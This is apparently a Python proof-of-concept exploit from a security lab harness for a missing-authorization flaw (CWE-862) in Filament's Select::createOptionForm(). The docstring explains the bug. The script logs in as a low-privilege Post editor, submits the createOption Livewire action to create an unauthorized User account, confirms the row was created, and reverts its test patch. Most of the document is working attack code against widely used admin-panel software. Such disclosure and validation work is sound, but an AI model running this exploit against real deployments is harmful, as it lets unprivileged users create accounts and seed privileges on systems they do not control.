#!/usr/bin/env python3
"""
VULN-003 — Select::createOptionForm() creates related-model records with no create authorization

Vulnerable code: targets/filament/packages/forms/src/Components/Select.php:234-307
  getCreateOptionAction(): gated ONLY by isDisabled() (:236) and the presence of the form
  schema (:240) — there is NO ->authorize() and no related-model `create` policy call anywhere.
  Default create closure (:968-976): newModelInstance()->fill($data)->save() + saveRelationships().

Class: CWE-862 Missing Authorization (broken access control).

The flaw in plain English
-------------------------
When a relationship() Select enables ->createOptionForm([...]) (the documented inline "+"
create pattern), the create-option action NEVER consults the related model's `create` policy.
The parent page only authorized the PARENT record; the related model's create ability is never
checked. So a user authorized only to edit a Post can create rows in whatever model the Select
relates to — here, new User accounts.

Exploitation idea
-----------------
As low-priv ryan (who may edit Posts, not create Users), mount the createOption action on the
author Select and submit it → a brand-new User row is persisted.

What a successful run proves
---------------------------
The User table row count increases and the injected account exists, created by a user with no
`create` right on User — unauthorized record creation (privilege seeding at worst).

Harness note: same as VULN-001 — the exploit adds the documented ->createOptionForm([...]) to
PostResource's existing relationship author Select (opt-in library feature; no library code
changed) and reverts it afterwards.
"""

import os
import sys
import time
import secrets

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient      # noqa: E402
from lib.common import log, banner, verdict  # noqa: E402
from lib import lab                          # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
ADMIN_USER = os.environ.get("ADMIN_USER", "ryan@filamentphp.com")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "password")
VULN_ID = "VULN-003"
HERE = os.path.dirname(os.path.abspath(__file__))
EDIT_COMPONENT = "app.filament.resources.post-resource.pages.edit-post"


def count_users() -> int:
    out = lab.tinker("echo \\App\\Models\\User::count();").strip().split("\n")[-1]
    import re
    m = re.search(r"(\d+)", out)
    return int(m.group(1)) if m else -1


def main() -> int:
    banner(VULN_ID, "Select::createOptionForm() creates related records with no create authz",
           BASE_URL, "Select::getCreateOptionAction — gated only by isDisabled(), no ->authorize()")

    log("SETUP", "adding ->createOptionForm([...]) to PostResource's relationship author Select "
                 "(documented opt-in pattern; harness; reverted after)")
    if not lab.patch_postresource_option_forms():
        log("FAIL", "could not patch PostResource (anchor not found)")
        verdict(VULN_ID, "FAILED", "harness patch failed")
        return 1
    time.sleep(3)
    try:
        suffix = secrets.token_hex(4)
        inj_mail = f"injected_{suffix}@attacker.invalid"
        inj_name = f"Injected {suffix}"

        before = count_users()
        log("INFO", f"User rows before: {before}")

        c = LivewireClient(BASE_URL)
        log("SETUP", f"logging in as low-priv {ADMIN_USER} (no 'create User' right)")
        c.login_admin_panel(ADMIN_USER, ADMIN_PASS)
        ep = c.get_component(f"{BASE_URL}/admin/posts/1/edit", component_name=EDIT_COMPONENT)

        # --- ATTACK: mount createOption and submit a new related-model record ----
        log("STEP", "mounting the createOption action on the author Select (no create policy is consulted)")
        ep.call("mountAction", "createOption", {},
                {"recordKey": "1", "schemaComponent": "form.author_id"})
        log("STEP", f"submitting the createOption modal → newModelInstance()->fill()->save() a new User")
        body = ep.call("callMountedAction", updates={
            "mountedActions.0.data.name": inj_name,
            "mountedActions.0.data.email": inj_mail,
            "mountedActions.0.data.password": f"InjectedPass-{suffix}!",
        })
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            import json
            f.write(json.dumps(body)[:2500])

        after = count_users()
        exists_out = lab.tinker(
            f"echo \\App\\Models\\User::where('email','{inj_mail}')->exists()?'YES':'NO';"
        ).strip().split("\n")[-1]
        created = ("YES" in exists_out) and (after == before + 1)
        log("PROOF", f"User rows after: {after} (was {before}); injected account exists: {exists_out.strip()}")

        if created:
            log("OK", "exploit confirmed — a low-priv Post editor created a new User record via "
                      "Select createOption with no create authorization")
            verdict(VULN_ID, "CONFIRMED",
                    "authenticated low-priv user creates arbitrary related-model records (e.g. new User) "
                    "via Select::createOptionForm with no create policy check (CWE-862)")
            return 0
        log("FAIL", f"no new User created (before={before} after={after} exists={exists_out})")
        verdict(VULN_ID, "FAILED", "createOption did not persist a related record")
        return 1
    finally:
        lab.revert_postresource()
        time.sleep(2)
        log("SETUP", "reverted the harness createOptionForm; PostResource restored")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
